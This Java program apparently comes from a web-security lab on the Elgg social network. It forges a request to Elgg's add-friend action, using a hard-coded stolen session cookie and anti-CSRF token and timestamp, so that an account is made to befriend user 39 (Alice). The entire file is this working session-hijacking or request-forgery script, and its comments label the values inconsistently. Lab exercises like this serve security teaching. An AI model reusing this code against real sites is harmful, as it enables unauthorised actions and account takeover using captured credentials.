import java.io.*;
import java.net.*;

public class HTTPSimpleForge { 

public static void main(String[] args) throws IOException { try {


    // friend_user_guid: Alice
    // __elgg_ts_value: Expires: "Thu, 19 Nov 1981 08:52:00 GMT"
    // __elgg_token_value: Cookie: Elgg="f46v2tsqtkr50iif78id8bq2o3" // boby

    String queryString = "?friend=39" +
                         "&__elgg_ts=1508442372" +
                         "&__elgg_token=c709e513435081c6707da87732ba290a";

    URL url = new URL("http://www.xsslabelgg.com/action/friends/add" + queryString);

    // 1. Create connection
    HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();

    if (urlConn instanceof HttpURLConnection) {
        urlConn.setConnectTimeout(60000);
        urlConn.setReadTimeout(90000);
    }

    // 2. Add HTTP header info
    urlConn.setRequestProperty("Host", "www.xsslabelgg.com");
    urlConn.setRequestProperty("User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0");
    urlConn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    urlConn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
    urlConn.setRequestProperty("Accept-Encoding", "gzip, deflate");
    urlConn.setRequestProperty("Referer", "http://www.xsslabelgg.com/profile/alice");
    urlConn.setRequestProperty("Cookie", "Elgg=j6fk84knlhmpkfleu4g0hg9ad5");
    urlConn.setRequestProperty("Connection", "keep-alive");
    urlConn.setRequestProperty("Upgrade-Insecure-Requests", "1");

    // 3. Add HTTP Post data
    String data = "name=alice&guid=39";
    urlConn.setDoOutput(true);
    OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
    wr.write(data);
    wr.flush();

    int responseCode;
    InputStream responseIn = null;

    if (urlConn instanceof HttpURLConnection) {
        HttpURLConnection httpConn = (HttpURLConnection) urlConn; // @WTF?

        responseCode = httpConn.getResponseCode();
        System.out.println("Response Code = " + responseCode);
        
        if (responseCode == HttpURLConnection.HTTP_OK) {
            responseIn = urlConn.getInputStream();
        }

        BufferedReader bufInput = new BufferedReader(new InputStreamReader(responseIn));
        String inputLine;
        while((inputLine = bufInput.readLine()) != null) {
            System.out.println(inputLine);
        }            
    }

} catch (MalformedURLException e) { 
    e.printStackTrace(); 
}}
} 